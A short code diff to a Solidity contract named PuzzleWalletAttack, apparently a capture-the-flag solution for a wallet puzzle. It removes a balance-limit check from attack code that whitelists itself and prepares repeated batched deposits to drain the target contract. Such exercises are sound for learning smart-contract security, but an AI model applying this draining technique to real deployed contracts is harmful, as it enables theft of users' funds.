@@ -16,8 +16,6 @@ contract PuzzleWalletAttack {
         target.addToWhitelist(address(this));
     
         uint256 numberOfIterations = (address(target).balance / msg.value) + 1;
-        require(target.maxBalance() > msg.value * numberOfIterations, "MaxBalance exceeded");
-
         bytes[] memory data = new bytes[](numberOfIterations);
 
         bytes[] memory depositData = new bytes[](1);
